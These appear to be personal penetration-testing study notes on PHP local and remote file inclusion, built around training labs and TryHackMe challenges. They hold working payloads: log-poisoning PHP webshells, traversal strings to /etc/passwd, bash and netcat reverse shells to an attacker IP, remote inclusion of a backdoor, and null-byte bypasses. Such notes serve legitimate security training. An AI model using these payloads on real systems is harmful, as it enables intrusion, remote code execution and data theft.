File Inclusion vulns
- Allows us to include a file into a webapp's running code
- Require attacks to execute code and write shell payload somewhere.
- Can also display the file contents of non-executable files

Difference btw Directory Traversal and File Inclusion
- w/ Directory Traversal, we'd be able to read the file contents of **admin.php**
- w/ File Inclusion, we'd be able to execute the file instead

  
**LFI** - Local File Inclusion - When the file is loaded from the same web server.  
**RFI** - Remote File Inclusion - When the file is loaded from an external source.  
  
Exploitation depends on both the language the app is written in and the server config.
- **PHP**
	- The version of the language runtime
	- Web server config's (_php.ini_) wrapper values
		- _register_globals_
		- _allow_url_include_ 

*NOTE: Important to read any errors that are displayed.  
- Might disclose full web directory
- Might disclose a define directory the devop forced the webapp to read from (Can circumvent via _?file=directory/../../../../etc/passwd_)
- Might disclose filtering: Devops filters out _../_ so using _....//....//....//_ works.

If bind/ reverse bind won't properly execute binaries, verify whether it's a [fully interactive TTY](Fully%20Interactive%20TTY.md)

# ID'ing

Can be discovered in same way as directory traversals
- Locate parameters we can manipulate and attempt to use them to load arbitrary files, then execute the contents.  
  
- Check parameters to see if they are vulnerable to RFI by changing their values to a URL instead of a local path.  
- Default configs for modern PHP versions disables remote URL includes, but we should still test.  
- Can use [nc](Tools.md#netcat), Apache, or Python to handle the request.  
- Host payloads on different ports as any remote connection may be subject to internal firewalls or routing rules.  
  
  
# Exploiting LFI

WebApp PHP:  
```php
<?php  
    $file = $_GET["file"];  
    include $file;  ?>
```
	App reads in the _file_ param from the request query string, then uses that value with an _include_ statement  
	Means app will execute any PHP code w/in the specified file.  
  
***Note:** If the file were opened with _fread_ and _echo_ were used to display the contents, then any code w/in the file would be displayed rather than executed.  

## Log file paths

#### Linux
- /var/log/apache2

#### Windows
- C:\\xampp\\apache\\logs\\


## Contaminating Log Files

If we can't upload a file to the server, we can try to inject code through log file poisoning.  
Submitting a request that includes PHP then using LFI to load the payload can work as most app servers will log all URLs that are requested.


1. Using the previous Directory Traversal vuln, use **curl** to analyze which elements comprise a log entry by displaying the file **access.log**
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../var/log/apache2/access.log
	...
	<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
	192.168.63.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/ HTTP/1.1" 200 2361 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
	192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
	...
```
- Shows that the User-Agent header is included in the log file
- Allows us to replace the header with php code to execute
```php
<?php echo system($_GET['cmd']); ?>
```

![](lfi_payload.png)
- Using Burp's Repeater to submit GET request for **admin.php** page and insert our payload w/in the User-Agent header
- 200 Response code indicates success


2. Test by navigating to the log file to execute the php stored in it, providing a ***cmd*** to execute.
![](lfi_testing.png)
- Note:  Use '*&*' to combine ***page*** and ***cmd*** parameters
- Note:  Remove User-Agent php code so as not to poison multiple times

3. Upgrade php code to get RCE

It's important to note that
- URL encoding will likely be needed
- As any provided commands will be run through the PHP *system* function
	- Be aware cmd may be executed via the *Bourne Shell*, **sh** rather than bash
	- To ensure running via bash, you'll need to use *"bash -c"* to execute w/in bash

```bash
# create revshell bash oneliner
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

# adjust so revshell is exectued in bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

# URL encode
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
![](lfi_rce.png)
	- Note that URL encoding is needed

## Old content

Ex (Using Win client w/ taco sight up & running):  
• Send a log file payload from attacker ip  
```bash
nc -nv 192.168.xxx.166 80
```
  
(UNKNOWN) \[192.168.xxx.10\] 80 (http) open  
```php
# simple backdoor
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
	- Written in PHP hence: \<?php ?\>  
	- Bulk of payload is echo command that will print output to the page  
	- Wrapped in _pre_ HTML tags preserving any line breaks or formatting in the results of the function call.  
	- _shell_exec_ executes an OS cmd retrieving from the “cmd” parameter of the GET request.  
	
 
 - Craft URL that utilize Directory Traversal to locate the Apache _access.log_ file, exploit the app's _include $file;_ statment, & execute the PHP code.
 ```null
 http://192.168.xxx.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
 
Result:
![[log_poisoning.png]]


To pop a shell:  
- Start listener on attacker box  
```bash
nc -nlvp 80
```
  
- Use log file poisoning to craft URL for reverse bind shell:  
```null
http://192.168.xxx.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20192.168.xxx.166%2080%20-e%20cmd.exe
```
  
  
# PHP Wrappers:

Can be used to exploit [Directory Traversal](9.1%20-%20Directory%20Traversal.md) and [LFI](#Exploiting%20LFI) vulns  
  
Can use the _data_ wrapper to embed inline data as part of the URL w/ plaintext or base64 data.  
Provides an alternative payload when local files can't be poisoned.

**php://filter**
- Displays the contents of files and executables\* either with or without encodings (Base64 or Rot13)
	- Allows us to review PHP files for sensitive information and analyze the web application's logic.
- Uses **resource** as the required parameter to specify the file stream for filtering, which is the filename in our case.

**php://data**
- Allows code execution
- Used to embed data elements as plaintext or base64-encoded data in the running web application's code.
- Requires _allow_url_include_ setting to be enabled


As PHP is executed on the server side, we won't be able to view it from the client side.

Adding encoding will allow us to view it by converting the specified source to Base64
```bash
# Encode to base64 to view resource of admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

# Exploiting RFI

- Pre-written backdoors can be found at _/usr/share/webshells_
- Less common than LFI as the target system must be configured for it
	- *allow_url_include* must be enabled

We'll use the Simple Backdoor
```bash
cat usr/share/webshells/php/simple-backdoor.php
```
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

Can use a [python3 server](Servers.md) to make the remote file available to the target system
```python
python3 -m http.server 80
```

Now, exploit
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

[Reverse shell from PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

## Old content

Easier to exploit, allows for more payload crafting flexibility, but less common than LFIs as the server must be configured very specifically for them
- PHP apps must be configured w/ _allow_url_include_ set to ‘ON’ (not default in newer versions)  
- If the config file is set w/ a **$** is present in _FilesMatch_, then double extensions are not allowed.  
  
Can test by creating a listener on attack box and crafting the URL:
```null
http://192.168.xxx.10/menu.php?file=http://192.168.xxx.166/evil.txt
```
	If output on attack box shows a GET request for _/evil.txt_ RFI is possible.  
  
  
\*Older versions of PHP have a vulnerability in which a null byte (%00) will terminate any string.  
This trick can be used to bypass file extensions added server-side (using BurpSuite) and is useful for file inclusions because it prevents the file extension from being considered as part of the string.  
In other words, if an app reads in a parameter and appends “.php” to it, a null byte passed in the parameter effectively ends the string without the “.php” extension.  
This gives an attacker more flexibility in what files can be loaded with the file inclusion vulnerability.  
[http://youtube.com/watch?v=jBtzFGwHvxE](http://youtube.com/watch?v=jBtzFGwHvxE)

\*Another trick for RFI payloads is to end them with a question mark (?) to mark anything added to the URL server-side as part of the query string  
  
  
Simple _webshell_ - software providing Web-based CLI:  
  
- Save the previous php cmd to the _evil.txt_ file  
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
 
- Refresh Apache  
```bash
sudo systemctl restart apache2
```
  
- Once file is in place (_/var/www/html_) & web server running can sent RFI attack URL to vuln web  
```null
http://192.168.xxx.10/menu.php?file=http://192.168.xxx.166/evil.txt&cmd=ipconfig
```

Can set _cmd_ to reverse bind w/ **nc** ^ 




# Null Bytes - Removed

Developers can specify the type of file it's looking for:  
```null
http://target.com/menu.php?file=/etc/passwd
```
becomes
```null
http://target.com/menu.php?file/etc/passwd.php
```

 
Adding the Null Byte _%00_ or _0x00_ to terminate the string and trick the webapp into ignoring everything else afterwards:  
```null
http://target.com/menu.php?file=/etc/passwd%00
```


This is patched in PHP 5.3.4 and above  
  
If the files are blocked, can attempt to view them by adding a _./_ at the end:  
```null
http://target.com/menu.php?file=../../../../etc/passwd/.
```

# TryHackMe LFI Challenges:

1. Input form is broken, but need to send POST request with ‘file=’  
```bash
curl -X POST http://10.10.44.240/challenges/chall1.php -d "file=etc/flag1"
```
 
2. Welcome Guest! Only Admins can access the page!  
	- Within Dev > Console  
```html
document.cookie="THM=admin"
```
	& refresh
	
 - Refreshes as admin page  
```html
document.cookie="THM=/etc/flag2"
```
	& refresh.  

- Returns error "Warning: include(includes//etc/flag2.php)  
	- Shows that files are being hosted from w/in _includes_ directory  
	- Shows that there's two _/_ from _includes_ to _etc_  
	- Shows request ends looking for _.php_ files  
```html
document.cookie="THM=../../../../../etc/flag2%00"
```
	& refresh.  
  
3. Include a file  
```null
http://10.10.44.240/challenges/chall3.php?file=/etc/flag3
```

- Returns error “Warning: include(etcflag.php)”  
	- Shows it's exluding _/_ char (Tested for multiple _/_ and all are being filtered)  
	- Shows request ends looking for _.php_ files  
	- Both work:  
```bash
curl -X POST http://10.10.44.240/challenges/chall3.php -d "file=/etc/flag3%00 --output -
```
```bash
